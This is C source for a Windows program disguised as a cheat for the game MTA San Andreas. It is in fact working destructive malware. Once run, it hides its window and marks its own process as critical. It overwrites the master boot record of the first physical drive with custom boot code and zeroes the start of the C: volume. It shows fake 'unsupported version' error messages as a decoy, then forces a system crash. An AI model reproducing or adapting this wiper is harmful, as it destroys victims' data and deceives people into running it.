#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <TlHelp32.h>

#include "resource.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winmm.lib")

EXTERN_C IMAGE_DOS_HEADER __ImageBase;
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

const unsigned char bootcode[] = 
{
	0x31, 0xC0, 0x8E, 0xC0, 0xBB, 0xD2, 0x04, 0x26, 0x89, 0x1E, 0xD8, 0x01, 0xFA, 0x8E, 0xD8, 0x8E,
	0xC0, 0x8E, 0xD0, 0x89, 0xC4, 0xB8, 0x02, 0x00, 0x50, 0xB8, 0x00, 0xF0, 0x50, 0xB8, 0xF0, 0xFF,
	0x50, 0xCF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

bool FindProcess(const wchar_t* processName)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry))
			if (!_wcsicmp(entry.szExeFile, processName))
				exists = true;

	CloseHandle(snapshot);
	return exists;
}

void TerminateProcessName(LPCWSTR lpProcessname)
{
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W prcs;
	prcs.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bTerminateProcessRes = Process32FirstW(hProcessSnapshot, &prcs);
	while (bTerminateProcessRes)
	{
		if (!lstrcmpW(prcs.szExeFile, lpProcessname))
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, prcs.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		bTerminateProcessRes = Process32NextW(hProcessSnapshot, &prcs);
	}
	CloseHandle(hProcessSnapshot);
}

DWORD WINAPI messageThread(LPVOID parameter)
{
	if (FindProcess(L"gta_sa.exe"))
	{
		Sleep(2500);
		MessageBoxA(NULL,
			"Exception Processing Message 0xc0000135 Parameters\nThis version may not be supported (1.5.9)\nTry with an older verison",
			"MTA Garbage", MB_OK | MB_ICONERROR);
	}
	else
	{
		MessageBoxA(NULL,
			"MTA San Andreas not found!\nPlease start the MTA before start the cheat!",
			"MTA Garbage", MB_OK | MB_ICONERROR);
	}

	return 0;
}

void main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	BOOLEAN PrivilegeState = FALSE;
	ULONG ErrorResponse = 1;
	NTSTATUS status;

	RtlAdjustPrivilege(20, TRUE, FALSE, &PrivilegeState);

	status = NtSetInformationProcess((HANDLE)-1, 0x1d, &ErrorResponse + 1, sizeof(ULONG));
	
	DWORD wb, wbC;

	HANDLE hDrive0 = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0, 
		OPEN_EXISTING, 0, 0);

	WriteFile(hDrive0, bootcode, 512, &wb, 0);
	CloseHandle(hDrive0);

	HANDLE hHeap = GetProcessHeap();
	LPVOID lpZero = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5120);

	HANDLE hDriveC = CreateFileW(
		L"\\\\.\\C:", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	SetFilePointer(hDriveC, 0, NULL, FILE_BEGIN);
	WriteFile(hDriveC, lpZero, 5120, &wbC, NULL);
	HeapFree(hHeap, NULL, lpZero);
	CloseHandle(hDriveC);
	
	CreateThread(0, 0, &messageThread, 0, 0, 0);
	
	Sleep(15000);

	PlaySoundW(MAKEINTRESOURCE(IDR_WAVE2), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);

	Sleep(1000);

	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &ErrorResponse);
}
